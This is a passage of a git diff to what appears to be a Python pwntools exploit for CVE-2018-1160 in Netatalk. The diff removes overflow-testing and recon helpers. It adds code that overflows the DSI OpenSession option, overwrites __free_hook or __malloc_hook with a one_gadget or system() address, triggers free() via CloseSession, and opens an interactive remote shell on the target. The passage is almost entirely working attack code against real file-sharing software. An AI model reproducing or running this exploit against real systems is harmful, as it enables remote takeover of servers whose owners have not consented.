+        prefix += p32(0xCAFE0000)
+        prefix += p32(0x00010001)
 
-                if machine_type_offset < len(data):
-                    # Extract server signature area
-                    log.info(f"Data preview: {data[:64].hex()}")
-
-    except Exception as e:
-        log.error(f"Recon failed: {e}")
-    finally:
-        dsi.disconnect()
+        addr_bytes = p64(hook)[:6]
+        payload = prefix + addr_bytes
 
+        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
+        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)
 
-def test_overflow(host, port):
-    """Debug function to test if overflow is working correctly"""
-    log.info("=== Testing Overflow Mechanism ===")
+        r.send(hdr + option)
 
-    # Test 1: Normal OpenSession
-    log.info("Test 1: Normal OpenSession (should succeed)")
-    dsi = DSI(host, port, timeout=5)
-    try:
-        dsi.connect()
-        option = bytes([DSIOPT_ATTNQUANT, 4]) + p32(0x00040000)
-        hdr = dsi.make_header(DSI_OPENSESSION, len(option))
-        dsi.send(hdr + option)
-        resp = dsi.recv_response()
-        if resp:
-            log.success(f"Normal OpenSession: OK (got {resp['length']} bytes)")
-            log.info(f"  Response: {resp['data'].hex()}")
-        else:
-            log.error("Normal OpenSession: FAILED (no response)")
+        try:
+            resp = r.recv(timeout=2)
+            if not resp:
+                r.close()
+                return False
+            log.success("Overflow successful!")
+        except Exception:
+            r.close()
             return False
-    finally:
-        dsi.disconnect()
 
-    # Test 2: Incremental overflow to find where crash occurs
-    log.info("Test 2: Incremental overflow size test...")
-    log.info("  Layout: attn(4) + datasize(4) + server_quantum(4) + IDs(4) + commands(8)")
+        # Now commands = __free_hook
+        # ANY packet with data will write that data to __free_hook
+        # We need ONE write + trigger
 
-    for size in [4, 8, 12, 16, 20, 24]:
-        dsi = DSI(host, port, timeout=3)
-        try:
-            dsi.connect()
-            # Build payload incrementally with valid values
-            payload = struct.pack("<I", 0x00040000)  # attn_quantum (4 bytes)
-            if size >= 8:
-                payload += struct.pack("<I", 0x00100000)  # datasize (4 bytes)
-            if size >= 12:
-                payload += struct.pack("<I", 0xCAFEBABE)  # server_quantum (4 bytes)
-            if size >= 16:
-                payload += struct.pack("<H", 0x0001)  # serverID (2 bytes)
-                payload += struct.pack("<H", 0x0001)  # clientID (2 bytes)
-            if size >= 20:
-                # Partial commands pointer (just 4 bytes)
-                payload += struct.pack("<I", 0x00000000)
-            if size >= 24:
-                # Full commands pointer (8 bytes total)
-                payload += struct.pack("<I", 0x00000000)
-
-            option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
-
-            hdr = dsi.make_header(DSI_OPENSESSION, len(option))
-            dsi.send(hdr + option)
-            resp = dsi.recv_response(timeout=2)
-
-            status = "OK" if resp else "CRASH"
-            log.info(f"  Size {size:2d} bytes: {status}")
-        except Exception as e:
-            log.info(f"  Size {size:2d} bytes: Exception - {e}")
-        finally:
-            dsi.disconnect()
-        time.sleep(0.2)
-
-    # Test 3: Try overflow with a high address (looks like valid libc range)
-    log.info("Test 3: Overflow with high address (0x7f0000000000 range)")
-
-    test_addrs = [
-        0x0,                    # NULL
-        0x7F0000000000,         # Low libc range
-        0x7FFFFF000000,         # High libc range
-        0x7F00003ED000,         # Near __free_hook range
-    ]
-
-    for addr in test_addrs:
-        dsi = DSI(host, port, timeout=3)
+        # Write one_gadget to __free_hook using DSI_CLOSESESSION with data
+        # DSI_CLOSESESSION triggers cleanup which calls free()
+        log.info("Writing one_gadget and triggering close in one packet")
+
+        # Use the best one_gadget
+        one_gadget = libc_base + ONE_GADGETS[0]  # 0x4f2c5
+        log.info(f"Using one_gadget: {hex(one_gadget)}")
+
+        # Send DSI_CLOSESESSION with our gadget as data
+        # The data gets written to __free_hook, then close triggers free()
+        close_payload = p64(one_gadget)
+        close_hdr = struct.pack(">BBHIII", 0x00, DSI_CLOSESESSION, 2, 0, len(close_payload), 0)
+        r.send(close_hdr + close_payload)
+
+        time.sleep(0.5)
+
+        # Test for shell
+        log.info("Testing for shell...")
         try:
-            dsi.connect()
-            options = build_overflow_options(addr)
-            hdr = dsi.make_header(DSI_OPENSESSION, len(options))
-            dsi.send(hdr + options)
-            resp = dsi.recv_response(timeout=2)
-
-            status = "OK (got response)" if resp else "CRASH (no response)"
-            log.info(f"  commands=0x{addr:016x}: {status}")
-        except Exception as e:
-            log.info(f"  commands=0x{addr:016x}: Exception - {e}")
-        finally:
-            dsi.disconnect()
-        time.sleep(0.2)
+            r.sendline(b"id")
+            response = r.recv(timeout=2)
+            log.info(f"Response: {response}")
+            if b"uid" in response:
+                log.success("Got shell!")
+                r.interactive()
+                return True
+        except Exception:
+            pass
 
-    # Test 4: Test oracle technique with sample addresses
-    log.info("Test 4: Testing probe_address_valid oracle...")
-    for addr in [0x0, 0x7F0000000000, 0x7FFFFF000000]:
-        result = probe_address_valid(host, port, addr)
-        log.info(f"  probe(0x{addr:016x}) = {result}")
-        time.sleep(0.2)
+        r.interactive()
+        r.close()
+        return False
 
-    log.info("=== Overflow test complete ===")
-    return True
+    except Exception as e:
+        log.error(f"Exploit error: {e}")
+        return False
 
 
 def main():
@@ -661,69 +530,95 @@ def main():
         if sys.argv[1] == "local":
             host = "localhost"
             port = 5566
-        elif sys.argv[1] == "test":
-            # Test mode - verify overflow works
-            test_overflow(host, port)
-            return
-        elif sys.argv[1] == "recon":
-            # Recon only
-            recon(host, port)
-            return
-        elif sys.argv[1] == "brute":
-            # Direct brute force mode
-            log.info(f"Target: {host}:{port}")
-            log.info("Direct brute force mode")
-            libc_base = bruteforce_libc_base(host, port)
-            if libc_base:
-                log.success(f"Found libc base: {hex(libc_base)}")
+        elif sys.argv[1] == "rtld":
+            # Quick test of rtld approach with known libc base
+            log.info("Quick rtld test mode")
+            leaked = leak_address_byte_by_byte(host, port)
+            if not leaked:
+                return
+            libc_base = find_libc_base(host, port, leaked)
+            if not libc_base:
+                return
+            exploit_rtld(host, port, libc_base, use_alt_offset=False)
+            time.sleep(0.5)
+            exploit_rtld(host, port, libc_base, use_alt_offset=True)
             return
         elif sys.argv[1].startswith("0x"):
             # Direct exploit with provided libc base
             libc_base = int(sys.argv[1], 16)
-            log.info(f"Target: {host}:{port}")
             log.info(f"Using provided libc base: {hex(libc_base)}")
+            # Try rtld first
+            if exploit_rtld(host, port, libc_base, use_alt_offset=False):
+                return
+            if exploit_rtld(host, port, libc_base, use_alt_offset=True):
+                return
             for i in range(len(ONE_GADGETS)):
                 log.info(f"Trying one_gadget {i}")
-                if do_exploit(host, port, libc_base, i):
-                    log.success("Exploit successful!")
+                if exploit(host, port, libc_base, i):
                     return
                 time.sleep(0.5)
-            log.error("All gadgets failed")
             return
 
     log.info(f"Target: {host}:{port}")
     log.info("CVE-2018-1160 Netatalk RCE Exploit")
     log.info("=" * 50)
 
-    # Step 1: Recon
-    recon(host, port)
-
-    # Step 2: Brute force libc base
-    # The byte-by-byte oracle doesn't work well because addresses in the
-    # 0x00-0xFF range are never valid. Instead, we brute force libc base directly.
-    log.info("=== Address Discovery Phase ===")
-    log.info("Bruteforcing libc base address...")
-    log.info("Target: libc __free_hook (offset 0x%x)" % LIBC_FREE_HOOK)
+    # Step 1: Leak address via byte-by-byte oracle
+    leaked = leak_address_byte_by_byte(host, port)
+    if not leaked:
+        log.error("Failed to leak address")
+        return
 
-    libc_base = bruteforce_libc_base(host, port)
+    # Step 2: Find libc base
+    libc_base = find_libc_base(host, port, leaked)
     if not libc_base:
         log.error("Failed to find libc base")
-        log.info("Try running: python3 exploit.py 0x<libc_base> with known base")
         return
 
     # Step 3: Exploit
     log.info("=== Exploitation Phase ===")
-    log.info(f"libc base: {hex(libc_base)}")
 
-    for i, gadget_offset in enumerate(ONE_GADGETS):
-        log.info(f"Trying one_gadget {i}: offset {hex(gadget_offset)}")
-        if do_exploit(host, port, libc_base, i):
+    # Try __free_hook with system()
+    log.info("Trying system() approach...")
+    if exploit_system(host, port, libc_base):
+        log.success("System exploit successful!")
+        return
+
+    # Try __free_hook with one_gadgets
+    log.info("Trying __free_hook with one_gadgets...")
+    for i in range(len(ONE_GADGETS)):
+        log.info(f"Trying one_gadget {i}: offset {hex(ONE_GADGETS[i])}")
+        if exploit(host, port, libc_base, i, use_malloc_hook=False):
+            log.success("Exploit successful!")
+            return
+        time.sleep(0.5)
+
+    # Try __malloc_hook
+    log.info("Trying __malloc_hook approach...")
+    for i in range(len(ONE_GADGETS)):
+        log.info(f"Trying one_gadget {i} with malloc_hook")
+        if exploit(host, port, libc_base, i, use_malloc_hook=True):
             log.success("Exploit successful!")
             return
-        log.warning(f"one_gadget {i} failed, trying next...")
-        time.sleep(1)
+        time.sleep(0.5)
+
+    log.warning("All hook approaches failed, trying rtld approach...")
+
+    # Try primary rtld offset
+    log.info(f"Trying rtld with primary offset 0x{RTLD_OFFSET:x}")
+    if exploit_rtld(host, port, libc_base, use_alt_offset=False):
+        log.success("RTLD exploit successful!")
+        return
+
+    time.sleep(1)
+
+    # Try alternative rtld offset
+    log.info(f"Trying rtld with alt offset 0x{RTLD_OFFSET_ALT:x}")
+    if exploit_rtld(host, port, libc_base, use_alt_offset=True):
+        log.success("RTLD exploit successful!")
+        return
 
-    log.error("All one_gadgets failed")
+    log.error("All exploits failed")
 
 
 if __name__ == "__main__":
-- 
2.47.3

